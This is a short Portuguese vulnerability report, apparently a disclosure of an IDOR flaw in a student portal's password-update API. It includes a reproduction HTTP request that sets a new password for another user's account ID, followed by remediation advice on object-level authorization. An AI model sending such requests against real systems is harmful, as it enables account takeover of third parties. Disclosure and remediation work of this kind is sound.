// 01. VULNERABILITY_OVERVIEW

Foi identificada uma falha de Insecure Direct Object Reference (IDOR) no serviço de persistência de identidade do portal Es*****o. A aplicação falha ao realizar o mapping de autorização entre o identificador do objeto no request body e a Session State do usuário autenticado.

// 02. EXPLOIT_REPRODUCTION

Insecure_Request_Intercepted

# Intercept via Burp Suite Proxy
POST /sianet/EmailEstudante/AtualizarSenha HTTP/1.1
Host: sia.es****o.br
Authorization: Bearer [REDACTED_JWT]
Content-Type: application/json; charset=UTF-8

{
  "E***cioId": "2024081*****", // Target Object ID (Victim)
  "DisplayName": "SA**** DE SO*** PE****",
  "Senha": "testpasswrd123",
  "ConfirmaSenha": "testpasswrd123"
}

Technical Insight:

A Business Logic da API assume que o E***cioId fornecido via JSON é o proprietário legítimo da sessão. Ao realizar o Server-Side Update, o backend utiliza esse identificador como chave primária na cláusula WHERE do banco de dados, permitindo a sobrescrita de credenciais de qualquer entity no sistema.

// 03. DEVSECOPS_REMEDIATION

Ação Reativa

Implementar Object-Level Authorization. O sistema deve validar se o UID contido na claims do JWT corresponde ao E***cioId requisitado.

Defesa em Camadas

Integrar testes de DAST no pipeline de CI/CD para identificar falhas de mapeamento de parâmetros em tempo de execução.
